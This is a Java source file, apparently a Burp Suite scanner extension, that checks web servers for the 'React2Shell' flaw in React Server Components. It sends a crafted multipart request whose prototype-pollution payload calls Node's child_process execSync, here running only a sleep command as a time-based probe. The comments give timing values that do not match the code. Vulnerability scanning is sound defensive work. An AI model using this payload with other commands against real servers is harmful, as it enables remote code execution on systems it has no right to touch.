package burp.ScanFun;

import burp.*;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.ArrayList;

public class React2ShellScan {

    public static IHttpRequestResponse Scan(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        // Use a time-based check.
        // Command: sleep 5
        String command = "sleep 2";
        
        String payloadJson = "{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B0\\\"}\",\"_response\":{\"_prefix\":\"process.mainModule.require('child_process').execSync('" + command + "');\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}";
        String payload2 = "\"$@0\"";
        
        List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
        // Remove existing Content-Type and add ours
        List<String> newHeaders = new ArrayList<>();
        for (String header : headers) {
            if (!header.toLowerCase().startsWith("content-type:") && !header.toLowerCase().startsWith("content-length:")) {
                newHeaders.add(header);
            }
        }
        
        // Ensure it is a POST
        if (!newHeaders.get(0).startsWith("POST")) {
            newHeaders.set(0, newHeaders.get(0).replace("GET", "POST"));
        }

        newHeaders.add("Next-Action: dontcare");
        newHeaders.add("Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW");
        
        String body = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n" +
                      "Content-Disposition: form-data; name=\"0\"; filename=\"payload.json\"\r\n" +
                      "Content-Type: application/json\r\n\r\n" +
                      payloadJson + "\r\n" +
                      "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n" +
                      "Content-Disposition: form-data; name=\"1\"; filename=\"payload2.txt\"\r\n" +
                      "Content-Type: text/plain\r\n\r\n" +
                      payload2 + "\r\n" +
                      "------WebKitFormBoundary7MA4YWxkTrZu0gW--";
                      
        byte[] newRequest = helpers.buildHttpMessage(newHeaders, body.getBytes(StandardCharsets.UTF_8));
        
        long startTime = System.currentTimeMillis();
        IHttpRequestResponse newRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
        long endTime = System.currentTimeMillis();
        
        if (endTime - startTime > 1500) { // Check if it took more than 4.5 seconds (allowing some variance for 5s sleep)
            // Potential Vulnerability found
            return newRequestResponse;
        }
        
        return null;
    }
}
